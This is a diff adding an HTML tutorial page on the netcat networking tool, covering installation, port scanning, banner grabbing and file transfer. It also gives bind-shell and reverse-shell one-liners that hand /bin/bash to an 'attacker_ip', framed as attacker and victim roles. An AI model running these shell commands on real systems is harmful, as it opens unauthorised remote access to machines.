@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Netcat Tool Guide</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 30px;
+      line-height: 2;
+    }
+    h1 {
+      font-size: 44px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    h2 {
+      font-size: 30px;
+      color: #00ffff;
+      border-bottom: 2px solid #00ff00;
+      padding-bottom: 10px;
+      margin-top: 40px;
+    }
+    p, li {
+      font-size: 20px;
+    }
+    code {
+      background: #111;
+      color: #00ffff;
+      padding: 6px 12px;
+      display: inline-block;
+      border-radius: 5px;
+      margin: 5px 0;
+    }
+    ul, ol {
+      padding-left: 30px;
+    }
+    li {
+      margin-bottom: 12px;
+    }
+    a {
+      color: #00ffff;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🛠️ Netcat (nc) Tool Guide</h1>
+
+  <h2>What is Netcat?</h2>
+  <p>
+    <strong>Netcat</strong> (often called <code>nc</code>) is a powerful networking utility used for debugging and investigating the network. It's known as the "Swiss Army Knife" of networking. It can read and write data across TCP and UDP connections, perform port scans, file transfers, backdoors, and banner grabbing.
+  </p>
+
+  <h2>Key Features</h2>
+  <ul>
+    <li>TCP/UDP port scanning</li>
+    <li>File transfer over the network</li>
+    <li>Reverse and bind shells</li>
+    <li>Banner grabbing (identify services)</li>
+    <li>Listen and connect to arbitrary ports</li>
+  </ul>
+
+  <h2>Installation</h2>
+  <h3>On Termux:</h3>
+  <code>pkg install netcat</code>
+
+  <h3>On Kali Linux:</h3>
+  <code>sudo apt install netcat</code>
+
+  <h3>Verify Installation:</h3>
+  <code>nc -h</code>
+
+  <h2>Step-by-Step Usage Examples</h2>
+
+  <h3>1. Port Scanning:</h3>
+  <code>nc -zv target.com 20-100</code><br>
+  <p><strong>z:</strong> Scan mode, <strong>v:</strong> verbose</p>
+
+  <h3>2. Banner Grabbing:</h3>
+  <code>nc target.com 80</code><br>
+  <p>Type: <code>HEAD / HTTP/1.0</code> + Enter</p>
+
+  <h3>3. File Transfer (Server Side):</h3>
+  <code>nc -l -p 1234 > received.txt</code>
+
+  <h3>4. File Transfer (Client Side):</h3>
+  <code>nc target_ip 1234 < file.txt</code>
+
+  <h3>5. Create a Simple Chat:</h3>
+  <code>On system 1: nc -l -p 8888</code><br>
+  <code>On system 2: nc ip_of_system1 8888</code>
+
+  <h3>6. Bind Shell (attacker connects to victim):</h3>
+  <code>On victim: nc -l -p 4444 -e /bin/bash</code><br>
+  <code>On attacker: nc victim_ip 4444</code>
+
+  <h3>7. Reverse Shell (victim connects back):</h3>
+  <code>On attacker: nc -lvp 4444</code><br>
+  <code>On victim: nc attacker_ip 4444 -e /bin/bash</code>
+
+  <h2>Netcat Tips</h2>
+  <ul>
+    <li>Use <code>-n</code> to skip DNS resolution</li>
+    <li>Use <code>-w</code> to set timeout (e.g. <code>-w 3</code>)</li>
+    <li>Use <code>-u</code> for UDP instead of TCP</li>
+  </ul>
+
+  <h2>⚠️ Legal Warning</h2>
+  <p>Netcat is extremely powerful and can be misused. Always use this tool for legal and educational purposes only.</p>
+
+</body>
+</html>
